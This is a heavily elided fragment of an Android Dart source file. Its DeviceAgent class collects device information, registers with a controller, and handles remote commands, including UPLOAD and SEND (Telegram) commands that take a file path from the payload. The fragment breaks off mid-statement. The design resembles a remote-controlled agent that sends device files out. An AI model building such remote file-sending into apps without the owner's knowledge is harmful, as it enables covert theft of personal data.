// lib/core/device_agent.dart - FINAL VERSION
import 'dart:async';
import 'dart:convert';
import 'dart:io';
...
class DeviceAgent {
  ...
  Future<Map<String, dynamic>> _collectDeviceInfo() async {
    try {
      print('[DeviceAgent] Collecting device info...');
      ...
      if (Platform.isAndroid) {
        ...
        print('[DeviceAgent] Device info collected: ${androidInfo.manufacturer} ${androidInfo.model}');
        return deviceInfo;
      }
  ...
  Future<void> register() async {
    if (_registered) {
      print('[DeviceAgent] Already registered');
      return;
    }
    ...
    try {
      ...
      _registered = true;
      print('[DeviceAgent] ✅ Registration complete with device info');
  ...
  Future<void> _handleCommand(Map<String, dynamic> raw) async {
    ...
    try {
      ...
      // Handle UPLOAD command explicitly
      ...
      // Handle SEND (Telegram) command explicitly
      else if (actionName == 'send' || actionName == 'sendTelegram' || (actionName == 'raw' && cmd.payload?['telegram'] != null)) {
        final path = cmd.payload?['path'] ?? cmd.payload?['file'];
